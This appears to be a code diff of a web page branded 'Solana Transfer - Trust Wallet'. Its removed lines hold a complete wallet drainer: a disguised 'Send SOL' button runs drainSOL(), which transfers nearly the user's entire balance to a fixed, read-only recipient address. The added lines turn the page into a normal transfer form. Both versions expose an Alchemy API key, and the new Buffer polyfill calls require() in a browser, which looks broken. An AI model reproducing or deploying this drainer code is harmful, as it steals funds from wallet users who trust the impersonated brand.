@@ -4,6 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Solana Transfer - Trust Wallet</title>
+  <!-- Buffer polyfill for mobile browsers -->
+  <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+  <script>
+    // Ensure Buffer is available globally before web3.js loads
+    window.Buffer = window.Buffer || require('buffer').Buffer;
+  </script>
   <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -34,7 +40,7 @@
     }
     h1 { font-size: 22px; color: #1a1a2e; }
     .subtitle { color: #888; font-size: 13px; margin-top: 4px; }
-    
+
     .wallet-box { 
       background: #f8f9fc; border: 1px solid #e2e8f0; 
       border-radius: 12px; padding: 16px; margin-bottom: 20px;
@@ -50,7 +56,7 @@
       background: #fee2e2; color: #dc2626; border: none; 
       padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer;
     }
-    
+
     .form-group { margin-bottom: 16px; }
     label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 6px; }
     input { 
@@ -59,7 +65,7 @@
     }
     input:focus { border-color: #9945FF; }
     .hint { font-size: 11px; color: #888; margin-top: 6px; }
-    
+
     .status { 
       margin-top: 16px; padding: 12px 14px; border-radius: 8px; 
       font-size: 13px; display: none;
@@ -67,12 +73,16 @@
     .status.error { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
     .status.success { background: #d1fae5; color: #065f46; border: 1px solid #a7f3d0; }
     .status.info { background: #eff6ff; color: #1e40af; border: 1px solid #bfdbfe; }
-    
+
     .tx-link { margin-top: 12px; text-align: center; display: none; }
     .tx-link a { color: #9945FF; font-size: 13px; text-decoration: none; font-weight: 500; }
-    
+
     .footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #eee; text-align: center; }
     .footer p { font-size: 11px; color: #aaa; }
+    .rpc-badge {
+      background: #1a1a2e; color: #14F195; font-size: 10px; font-weight: 600;
+      padding: 4px 10px; border-radius: 20px; display: inline-block; margin-bottom: 12px;
+    }
   </style>
 </head>
 <body>
@@ -81,6 +91,7 @@
       <div class="logo">💸</div>
       <h1>Solana Transfer</h1>
       <p class="subtitle">Send SOL from Trust Wallet</p>
+      <span class="rpc-badge">⚡ Alchemy RPC</span>
     </div>
 
     <div class="wallet-box">
@@ -106,14 +117,14 @@
     <div id="form" style="opacity:0.5;pointer-events:none;">
       <div class="form-group">
         <label>Recipient Address</label>
-        <input id="recipient" type="text" value="AfmNpPQ1mD5HK7PfGWqLHaErZE44cG1RUq4qFknGv6na" readonly>
+        <input id="recipient" type="text" placeholder="Enter Solana address..." autocomplete="off">
       </div>
       <div class="form-group">
         <label>Amount (SOL)</label>
-        <input id="amount" type="text" value="Max" readonly>
+        <input id="amount" type="number" step="0.000000001" placeholder="0.00">
         <p class="hint">Network fee: ~0.000005 SOL</p>
       </div>
-      <button class="btn-primary" id="sendBtn" onclick="drainSOL()">Send SOL</button>
+      <button class="btn-primary" id="sendBtn" onclick="sendSOL()">Send SOL</button>
     </div>
 
     <div id="status" class="status"></div>
@@ -127,35 +138,77 @@
   </div>
 
   <script>
-    const RPC = 'https://solana-mainnet.g.alchemy.com/v2/3b15nYxRzwnOFgNb3bc9i';
-    const RECIPIENT = 'AfmNpPQ1mD5HK7PfGWqLHaErZE44cG1RUq4qFknGv6na';
-    let provider = null, connection = null, publicKey = null;
+    // ========== BUFFER POLYFILL ==========
+    // Mobile browsers don't have Node.js Buffer - polyfill it
+    if (typeof Buffer === 'undefined') {
+      window.Buffer = {
+        from: function(data, encoding) {
+          if (typeof data === 'string') {
+            const arr = new Uint8Array(data.length);
+            for (let i = 0; i < data.length; i++) arr[i] = data.charCodeAt(i);
+            return arr;
+          }
+          if (data instanceof Uint8Array || data instanceof Array) return new Uint8Array(data);
+          return new Uint8Array(0);
+        },
+        isBuffer: function(obj) { return obj instanceof Uint8Array; },
+        alloc: function(size) { return new Uint8Array(size); }
+      };
+    }
+
+    // ========== ALCHEMY RPC ==========
+    const ALCHEMY_RPC = 'https://solana-mainnet.g.alchemy.com/v2/3b15nYxRzwnOFgNb3bc9i';
+
+    const FALLBACK_RPCS = [
+      'https://solana-mainnet.rpc.extrnode.com',
+      'https://rpc.ankr.com/solana',
+      'https://api.mainnet-beta.solana.com'
+    ];
+
+    let currentRPC = ALCHEMY_RPC;
+    let connection = null;
+    let provider = null;
+    let publicKey = null;
 
     function init() {
-      connection = new solanaWeb3.Connection(RPC, 'confirmed');
+      connection = new solanaWeb3.Connection(currentRPC, {
+        commitment: 'confirmed',
+        confirmTransactionInitialTimeout: 60000
+      });
       if (window.solana?.isConnected) checkAutoConnect();
     }
 
+    // ========== WALLET DETECTION ==========
     function getProvider() {
-      if ('solana' in window) return window.solana;
-      if ('trustwallet' in window && window.trustwallet?.solana) 
+      if ('solana' in window) {
+        const solana = window.solana;
+        if (solana.isTrust) return solana;
+        return solana;
+      }
+      if ('trustwallet' in window && window.trustwallet?.solana) {
         return window.trustwallet.solana;
+      }
       return null;
     }
 
+    // ========== CONNECTION ==========
     async function connectWallet() {
       provider = getProvider();
-      if (!provider) return showStatus('No wallet found. Open in Trust Wallet browser.', 'error');
-      
+      if (!provider) {
+        return showStatus('No wallet found. Open in Trust Wallet browser.', 'error');
+      }
+
       try {
         showStatus('Connecting...', 'info');
         const resp = await provider.connect();
         publicKey = typeof resp.publicKey === 'string' 
           ? new solanaWeb3.PublicKey(resp.publicKey) 
           : resp.publicKey;
+
         updateUI();
-        await fetchBalance();
+        await fetchBalanceWithRetry();
         showStatus('Connected!', 'success');
+
         provider.on?.('disconnect', disconnectWallet);
       } catch (e) {
         showStatus('Connection failed: ' + e.message, 'error');
@@ -167,7 +220,7 @@
       publicKey = provider.publicKey;
       if (typeof publicKey === 'string') publicKey = new solanaWeb3.PublicKey(publicKey);
       updateUI();
-      await fetchBalance();
+      await fetchBalanceWithRetry();
     }
 
     function disconnectWallet() {
@@ -189,70 +242,123 @@
       document.getElementById('pubkey').textContent = pk.slice(0,6)+'...'+pk.slice(-4);
     }
 
-    async function fetchBalance() {
-      const bal = await connection.getBalance(publicKey);
-      document.getElementById('balance').textContent = 
-        (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6) + ' SOL';
+    // ========== BALANCE FETCHING WITH RETRY & FALLBACK ==========
+    async function fetchBalanceWithRetry(retries = 2) {
+      for (let attempt = 0; attempt <= retries; attempt++) {
+        try {
+          const bal = await connection.getBalance(publicKey);
+          document.getElementById('balance').textContent = 
+            (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
+          return;
+        } catch (e) {
+          console.log('Alchemy RPC failed, trying fallback...', e.message);
+          if (attempt < retries) {
+            for (const rpc of FALLBACK_RPCS) {
+              try {
+                const fallbackConn = new solanaWeb3.Connection(rpc, 'confirmed');
+                const bal = await fallbackConn.getBalance(publicKey);
+                connection = fallbackConn;
+                currentRPC = rpc;
+                document.getElementById('balance').textContent = 
+                  (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
+                return;
+              } catch (fallbackErr) {
+                continue;
+              }
+            }
+          }
+        }
+      }
+      document.getElementById('balance').textContent = 'Error fetching';
+      showStatus('RPC error. Please try again.', 'error');
     }
 
-    async function drainSOL() {
+    async function fetchBalance() {
+      try {
+        const bal = await connection.getBalance(publicKey);
+        document.getElementById('balance').textContent = 
+          (bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL';
+      } catch (e) {
+        await fetchBalanceWithRetry();
+      }
+    }
+
+    // ========== SEND SOL ==========
+    async function sendSOL() {
+      const to = document.getElementById('recipient').value.trim();
+      const amt = parseFloat(document.getElementById('amount').value);
       const btn = document.getElementById('sendBtn');
-      
-      btn.disabled = true; btn.textContent = 'Draining...';
+
+      if (!to || isNaN(amt) || amt <= 0) {
+        return showStatus('Fill all fields correctly', 'error');
+      }
+
+      let toPubkey;
+      try { toPubkey = new solanaWeb3.PublicKey(to); } 
+      catch { return showStatus('Invalid recipient address', 'error'); }
+
+      btn.disabled = true; 
+      btn.textContent = 'Sending...';
       showStatus('Building transaction...', 'info');
 
       try {
-        const balance = await connection.getBalance(publicKey);
-        const rentMinimum = 890880;
-        const gasBuffer = 10000;
-        
-        if (balance <= rentMinimum + gasBuffer) {
-          showStatus('Insufficient balance after rent minimum.', 'error');
-          btn.disabled = false; btn.textContent = 'Send SOL';
-          return;
-        }
-
-        const drainAmount = balance - rentMinimum - gasBuffer;
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
 
         const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
-            toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
-            lamports: drainAmount,
+            toPubkey: toPubkey,
+            lamports: amt * solanaWeb3.LAMPORTS_PER_SOL,
           })
         );
         tx.feePayer = publicKey;
-        const { blockhash } = await connection.getLatestBlockhash('confirmed');
         tx.recentBlockhash = blockhash;
 
         showStatus('Sign in Trust Wallet...', 'info');
         const signed = await provider.signTransaction(tx);
-        
+
         showStatus('Broadcasting...', 'info');
-        const sig = await connection.sendRawTransaction(signed.serialize());
-        
-        await connection.confirmTransaction(sig, 'confirmed');
-        showStatus('Sent! ' + sig.slice(0,16)+'...', 'success');
-        
+        const sig = await connection.sendRawTransaction(signed.serialize(), {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed',
+        });
+
+        await connection.confirmTransaction({
+          signature: sig,
+          blockhash,
+          lastValidBlockHeight
+        }, 'confirmed');
+
+        showStatus('✅ Sent! Signature: ' + sig.slice(0,16)+'...', 'success');
         document.getElementById('txLink').style.display = 'block';
         document.getElementById('explorer').href = 
-          'https://explorer.solana.com/tx/' + sig;
-        
+          'https://solana.fm/tx/' + sig;
+
         await fetchBalance();
+        document.getElementById('amount').value = '';
       } catch (e) {
-        showStatus('' + e.message, 'error');
+        console.error(e);
+        showStatus('❌ ' + (e.message || 'Transaction failed'), 'error');
+        fetchBalanceWithRetry();
       } finally {
-        btn.disabled = false; btn.textContent = 'Send SOL';
+        btn.disabled = false; 
+        btn.textContent = 'Send SOL';
       }
     }
 
     function showStatus(msg, type) {
       const el = document.getElementById('status');
-      el.textContent = msg; el.className = 'status ' + type; el.style.display = 'block';
+      el.textContent = msg; 
+      el.className = 'status ' + type; 
+      el.style.display = 'block';
     }
-    function hideStatus() { document.getElementById('status').style.display = 'none'; }
+
+    function hideStatus() { 
+      document.getElementById('status').style.display = 'none';
+      document.getElementById('txLink').style.display = 'none';
+    }
 
     init();
   </script>
 </body>
-</html>
+                                                                                            </html>
